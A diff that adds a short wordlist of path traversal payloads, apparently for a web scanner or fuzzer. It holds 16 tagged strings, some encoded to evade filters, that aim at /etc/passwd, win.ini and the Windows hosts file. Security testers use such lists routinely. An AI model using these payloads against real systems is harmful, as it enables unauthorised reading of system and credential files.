@@ -1,0 +1,17 @@
+# Path traversal deep payloads.
+[nix]../../../../etc/passwd
+[nix]../../../../../../etc/passwd
+[nix]/etc/passwd
+[nix]/etc/passwd%00
+[nix]file:///etc/passwd
+[any]%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
+[any]%252e%252e%252fetc%252fpasswd
+[any]....//....//....//etc/passwd
+[any]..%c0%af..%c0%afetc/passwd
+[win]..\..\..\..\windows\win.ini
+[win]..\..\..\..\..\..\windows\win.ini
+[win]c:\windows\win.ini
+[win]c:\windows\system32\drivers\etc\hosts
+[win]C:\Windows\win.ini
+[win]..%5c..%5c..%5cWindows%5cwin.ini
+[win]file:///C:/Windows/win.ini
